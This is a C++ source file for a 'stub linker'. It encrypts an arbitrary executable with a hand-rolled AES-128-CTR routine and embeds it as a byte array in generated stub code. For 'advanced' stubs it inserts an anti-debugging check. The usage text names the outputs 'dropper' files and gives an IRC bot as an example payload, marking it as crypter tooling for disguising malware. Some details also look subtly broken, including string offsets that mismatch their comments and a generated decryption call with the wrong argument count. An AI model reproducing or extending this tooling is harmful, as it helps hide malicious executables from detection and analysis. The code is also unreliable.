#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>

class StubLinker {
private:
    std::mt19937 rng;
    
    // AES-128-CTR implementation (same as native_encryptor)
    static const uint8_t sbox[256];
    static const uint8_t inv_sbox[256];
    static const uint8_t rcon[11];
    
    void subBytes(uint8_t state[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] = sbox[state[i]];
        }
    }
    
    void invSubBytes(uint8_t state[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] = inv_sbox[state[i]];
        }
    }
    
    void shiftRows(uint8_t state[16]) {
        uint8_t temp;
        // Row 1: shift left by 1
        temp = state[1];
        state[1] = state[5];
        state[5] = state[9];
        state[9] = state[13];
        state[13] = temp;
        
        // Row 2: shift left by 2
        temp = state[2]; state[2] = state[10]; state[10] = temp;
        temp = state[6]; state[6] = state[14]; state[14] = temp;
        
        // Row 3: shift left by 3
        temp = state[3];
        state[3] = state[15];
        state[15] = state[11];
        state[11] = state[7];
        state[7] = temp;
    }
    
    void invShiftRows(uint8_t state[16]) {
        uint8_t temp;
        // Row 1: shift right by 1
        temp = state[13];
        state[13] = state[9];
        state[9] = state[5];
        state[5] = state[1];
        state[1] = temp;
        
        // Row 2: shift right by 2
        temp = state[2]; state[2] = state[10]; state[10] = temp;
        temp = state[6]; state[6] = state[14]; state[14] = temp;
        
        // Row 3: shift right by 3
        temp = state[3];
        state[3] = state[7];
        state[7] = state[11];
        state[11] = state[15];
        state[15] = temp;
    }
    
    uint8_t gmul(uint8_t a, uint8_t b) {
        uint8_t p = 0;
        uint8_t hi_bit_set;
        for (int i = 0; i < 8; i++) {
            if ((b & 1) != 0) {
                p ^= a;
            }
            hi_bit_set = (uint8_t)(a & 0x80);
            a <<= 1;
            if (hi_bit_set != 0) {
                a ^= 0x1b;
            }
            b >>= 1;
        }
        return p;
    }
    
    void mixColumns(uint8_t state[16]) {
        uint8_t temp[16];
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                temp[i * 4 + j] = gmul(0x02, state[i * 4 + j]) ^
                                 gmul(0x03, state[i * 4 + (j + 1) % 4]) ^
                                 state[i * 4 + (j + 2) % 4] ^
                                 state[i * 4 + (j + 3) % 4];
            }
        }
        memcpy(state, temp, 16);
    }
    
    void invMixColumns(uint8_t state[16]) {
        uint8_t temp[16];
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                temp[i * 4 + j] = gmul(0x0e, state[i * 4 + j]) ^
                                 gmul(0x0b, state[i * 4 + (j + 1) % 4]) ^
                                 gmul(0x0d, state[i * 4 + (j + 2) % 4]) ^
                                 gmul(0x09, state[i * 4 + (j + 3) % 4]);
            }
        }
        memcpy(state, temp, 16);
    }
    
    void addRoundKey(uint8_t state[16], const uint8_t roundKey[16]) {
        for (int i = 0; i < 16; i++) {
            state[i] ^= roundKey[i];
        }
    }
    
    void keyExpansion(const uint8_t key[16], uint8_t roundKeys[11][16]) {
        uint8_t temp[4];
        
        // Copy the original key to the first round key
        memcpy(roundKeys[0], key, 16);
        
        for (int i = 1; i < 11; i++) {
            // Copy the previous round key's last 4 bytes
            memcpy(temp, roundKeys[i-1] + 12, 4);
            
            // Rotate left
            uint8_t t = temp[0];
            temp[0] = temp[1];
            temp[1] = temp[2];
            temp[2] = temp[3];
            temp[3] = t;
            
            // SubBytes
            for (int j = 0; j < 4; j++) {
                temp[j] = sbox[temp[j]];
            }
            
            // XOR with round constant
            temp[0] ^= rcon[i];
            
            // XOR with the previous round key's first 4 bytes
            for (int j = 0; j < 4; j++) {
                roundKeys[i][j] = roundKeys[i-1][j] ^ temp[j];
            }
            
            // Generate the rest of the round key
            for (int j = 4; j < 16; j++) {
                roundKeys[i][j] = roundKeys[i-1][j] ^ roundKeys[i][j-4];
            }
        }
    }
    
    void aesCtrCrypt(uint8_t* data, size_t dataLen, const uint8_t key[16], const uint8_t nonce[16]) {
        uint8_t roundKeys[11][16];
        keyExpansion(key, roundKeys);
        
        uint8_t counter[16];
        memcpy(counter, nonce, 16);
        
        for (size_t i = 0; i < dataLen; i += 16) {
            uint8_t keystream[16];
            uint8_t counterCopy[16];
            memcpy(counterCopy, counter, 16);
            
            // Encrypt the counter to get keystream
            addRoundKey(counterCopy, roundKeys[0]);
            for (int round = 1; round < 10; round++) {
                subBytes(counterCopy);
                shiftRows(counterCopy);
                mixColumns(counterCopy);
                addRoundKey(counterCopy, roundKeys[round]);
            }
            subBytes(counterCopy);
            shiftRows(counterCopy);
            addRoundKey(counterCopy, roundKeys[10]);
            
            memcpy(keystream, counterCopy, 16);
            
            // XOR with data
            size_t blockSize = std::min(16UL, dataLen - i);
            for (size_t j = 0; j < blockSize; j++) {
                data[i + j] ^= keystream[j];
            }
            
            // Increment counter
            for (int j = 15; j >= 0; j--) {
                counter[j]++;
                if (counter[j] != 0) break;
            }
        }
    }
    
    std::string generateRandomKey() {
        std::string key;
        for (int i = 0; i < 32; i++) {
            key += "0123456789abcdef"[rng() % 16];
        }
        return key;
    }
    
    std::string generateRandomNonce() {
        std::string nonce;
        for (int i = 0; i < 32; i++) {
            nonce += "0123456789abcdef"[rng() % 16];
        }
        return nonce;
    }
    
    void hexToBytes(const std::string& hex, uint8_t* bytes) {
        for (size_t i = 0; i < hex.length(); i += 2) {
            std::string byteString = hex.substr(i, 2);
            bytes[i/2] = (uint8_t)strtol(byteString.c_str(), NULL, 16);
        }
    }
    
    std::string bytesToHex(const uint8_t* bytes, size_t length) {
        std::string hex;
        for (size_t i = 0; i < length; i++) {
            char hexByte[3];
            sprintf(hexByte, "%02x", bytes[i]);
            hex += hexByte;
        }
        return hex;
    }
    
    std::string embedDataAsArray(const std::vector<uint8_t>& data) {
        std::string result = "{";
        for (size_t i = 0; i < data.size(); i++) {
            if (i > 0) result += ", ";
            char hex[5];
            sprintf(hex, "0x%02x", data[i]);
            result += hex;
        }
        result += "}";
        return result;
    }
    
public:
    StubLinker() : rng(std::time(nullptr)) {}
    
    void linkStubWithExecutable(const std::string& stubFile, const std::string& executableFile, 
                               const std::string& outputFile) {
        std::cout << "Linking stub with executable..." << std::endl;
        
        // Read the stub file
        std::ifstream stubIn(stubFile);
        if (!stubIn.is_open()) {
            std::cerr << "Error: Cannot open stub file: " << stubFile << std::endl;
            return;
        }
        
        std::string stubContent((std::istreambuf_iterator<char>(stubIn)),
                               std::istreambuf_iterator<char>());
        stubIn.close();
        
        // Read the executable file
        std::ifstream exeIn(executableFile, std::ios::binary);
        if (!exeIn.is_open()) {
            std::cerr << "Error: Cannot open executable file: " << executableFile << std::endl;
            return;
        }
        
        std::vector<uint8_t> exeData((std::istreambuf_iterator<char>(exeIn)),
                                    std::istreambuf_iterator<char>());
        exeIn.close();
        
        if (exeData.empty()) {
            std::cerr << "Error: Executable file is empty" << std::endl;
            return;
        }
        
        // Extract key and nonce from the standalone stub
        std::string keyHex, nonceHex, keyVarName, nonceVarName;
        
        // Find key definition line (e.g., "const std::string KEY_abc123 = "4cde442ea60bd71c0caed5503ff32a17";")
        size_t keyDefStart = stubContent.find("const std::string KEY_");
        if (keyDefStart != std::string::npos) {
            // Extract the full variable name including KEY_
            size_t keyNameStart = keyDefStart + 20; // Skip "const std::string "
            size_t keyNameEnd = stubContent.find(" = ", keyNameStart);
            if (keyNameEnd != std::string::npos) {
                keyVarName = stubContent.substr(keyNameStart, keyNameEnd - keyNameStart);
                std::cerr << "DEBUG: keyNameStart=" << keyNameStart << ", keyNameEnd=" << keyNameEnd << std::endl;
                std::cerr << "DEBUG: Extracted keyVarName='" << keyVarName << "'" << std::endl;
            }
            size_t keyStart = stubContent.find("\"", keyDefStart);
            size_t keyEnd = stubContent.find("\"", keyStart + 1);
            if (keyStart != std::string::npos && keyEnd != std::string::npos) {
                keyHex = stubContent.substr(keyStart + 1, keyEnd - keyStart - 1);
            }
        }
        
        // Find nonce definition line (e.g., "const std::string NONCE_def456 = "76741508ffff0d9fd474ccb52c83286c";")
        size_t nonceDefStart = stubContent.find("const std::string NONCE_");
        if (nonceDefStart != std::string::npos) {
            // Extract the full variable name including NONCE_
            size_t nonceNameStart = nonceDefStart + 22; // Skip "const std::string "
            size_t nonceNameEnd = stubContent.find(" = ", nonceNameStart);
            if (nonceNameEnd != std::string::npos) {
                nonceVarName = stubContent.substr(nonceNameStart, nonceNameEnd - nonceNameStart);
            }
            size_t nonceStart = stubContent.find("\"", nonceDefStart);
            size_t nonceEnd = stubContent.find("\"", nonceStart + 1);
            if (nonceStart != std::string::npos && nonceEnd != std::string::npos) {
                nonceHex = stubContent.substr(nonceStart + 1, nonceEnd - nonceStart - 1);
            }
        }
        
        if (keyHex.empty() || nonceHex.empty() || keyVarName.empty() || nonceVarName.empty()) {
            std::cerr << "Error: Could not extract key/nonce from standalone stub" << std::endl;
            std::cerr << "  Key found: " << (!keyHex.empty()) << " (" << keyHex << ")" << std::endl;
            std::cerr << "  Nonce found: " << (!nonceHex.empty()) << " (" << nonceHex << ")" << std::endl;
            std::cerr << "  Key var found: " << (!keyVarName.empty()) << " (" << keyVarName << ")" << std::endl;
            std::cerr << "  Nonce var found: " << (!nonceVarName.empty()) << " (" << nonceVarName << ")" << std::endl;
            return;
        }
        
        std::cout << "Extracted from stub:" << std::endl;
        std::cout << "  Key variable: " << keyVarName << std::endl;
        std::cout << "  Nonce variable: " << nonceVarName << std::endl;
        std::cout << "  Key hex: " << keyHex << std::endl;
        std::cout << "  Nonce hex: " << nonceHex << std::endl;
        
        // Convert to bytes
        uint8_t key[16], nonce[16];
        hexToBytes(keyHex, key);
        hexToBytes(nonceHex, nonce);
        
        // Encrypt the executable data using the stub's key/nonce
        std::vector<uint8_t> encryptedData = exeData;
        aesCtrCrypt(encryptedData.data(), encryptedData.size(), key, nonce);
        
        // Simple approach: Find the main function and replace everything after the opening brace
        size_t mainStart = stubContent.find("int main() {");
        if (mainStart == std::string::npos) {
            std::cerr << "Error: Could not find main function in stub" << std::endl;
            return;
        }
        
        // Find the opening brace of main
        size_t mainBraceStart = stubContent.find("{", mainStart);
        if (mainBraceStart == std::string::npos) {
            std::cerr << "Error: Could not find main function opening brace" << std::endl;
            return;
        }
        
        // Find the last closing brace of the file (end of main function)
        size_t lastBrace = stubContent.rfind("}");
        if (lastBrace == std::string::npos) {
            std::cerr << "Error: Could not find main function closing brace" << std::endl;
            return;
        }
        
        // Create the new main function content
        std::string embeddedDataArray = embedDataAsArray(encryptedData);
        
        // Check if this is an advanced stub (has isDebugged function)
        bool isAdvancedStub = (stubContent.find("bool isDebugged()") != std::string::npos);
        
        std::string newMainContent = "int main() {\n";
        
        // Add anti-debugging check only for advanced stubs
        if (isAdvancedStub) {
            newMainContent += 
                "    if (isDebugged()) {\n"
                "        std::cerr << \"Debugging detected!\" << std::endl;\n"
                "        return 1;\n"
                "    }\n\n";
        }
        
        newMainContent += 
            "    // Convert hex strings to bytes\n"
            "    uint8_t key[16], nonce[16];\n"
            "    hexToBytes(" + keyVarName + ", key);\n"
            "    hexToBytes(" + nonceVarName + ", nonce);\n\n"
            "    // Embedded encrypted executable data\n"
            "    uint8_t embeddedData[] = " + embeddedDataArray + ";\n"
            "    const size_t embeddedDataSize = sizeof(embeddedData);\n\n"
            "    // Decrypt the data using AES-128-CTR\n"
            "    aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);\n\n"
            "    // Write decrypted data to file\n"
            "    std::ofstream outFile(\"decrypted_output.bin\", std::ios::binary);\n"
            "    if (outFile.is_open()) {\n"
            "        outFile.write(reinterpret_cast<const char*>(embeddedData), embeddedDataSize);\n"
            "        outFile.close();\n"
            "        std::cout << \"Data decrypted and saved to decrypted_output.bin\" << std::endl;\n"
            "    } else {\n"
            "        std::cerr << \"Failed to create output file\" << std::endl;\n"
            "        return 1;\n"
            "    }\n\n"
            "    return 0;\n"
            "}";
        
        // Replace the entire main function
        stubContent.replace(mainStart, lastBrace - mainStart + 1, newMainContent);
        

        

        
        // Write the final linked stub
        std::ofstream outFile(outputFile);
        if (!outFile.is_open()) {
            std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
            return;
        }
        
        outFile << stubContent;
        outFile.close();
        
        std::cout << "✓ Stub linked with executable successfully!" << std::endl;
        std::cout << "  Stub file: " << stubFile << std::endl;
        std::cout << "  Executable: " << executableFile << std::endl;
        std::cout << "  Output: " << outputFile << std::endl;
        std::cout << "  Original size: " << exeData.size() << " bytes" << std::endl;
        std::cout << "  Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "  Using stub's key: " << keyHex << std::endl;
        std::cout << "  Using stub's nonce: " << nonceHex << std::endl;
        std::cout << "  To compile: g++ -std=c++17 -o " << outputFile.substr(0, outputFile.find('.')) 
                  << " " << outputFile << std::endl;
    }
    
    void showHelp() {
        std::cout << "Stub Linker - Link standalone stubs with executables" << std::endl;
        std::cout << "=====================================================" << std::endl;
        std::cout << std::endl;
        std::cout << "Usage:" << std::endl;
        std::cout << "  ./stub_linker <stub.cpp> <executable> <output.cpp>" << std::endl;
        std::cout << std::endl;
        std::cout << "Arguments:" << std::endl;
        std::cout << "  stub.cpp    - Standalone stub file (generated with --standalone)" << std::endl;
        std::cout << "  executable  - Executable file to embed and encrypt" << std::endl;
        std::cout << "  output.cpp  - Output linked stub file" << std::endl;
        std::cout << std::endl;
        std::cout << "Examples:" << std::endl;
        std::cout << "  ./stub_linker standalone_stub.cpp calc.exe final_dropper.cpp" << std::endl;
        std::cout << "  ./stub_linker advanced_stub.cpp mirc_bot.exe advanced_dropper.cpp" << std::endl;
        std::cout << std::endl;
    }
};

// AES S-box and constants
const uint8_t StubLinker::sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

const uint8_t StubLinker::inv_sbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

const uint8_t StubLinker::rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

int main(int argc, char* argv[]) {
    StubLinker linker;
    
    if (argc != 4) {
        linker.showHelp();
        return 1;
    }
    
    std::string stubFile = argv[1];
    std::string executableFile = argv[2];
    std::string outputFile = argv[3];
    
    linker.linkStubWithExecutable(stubFile, executableFile, outputFile);
    
    return 0;
}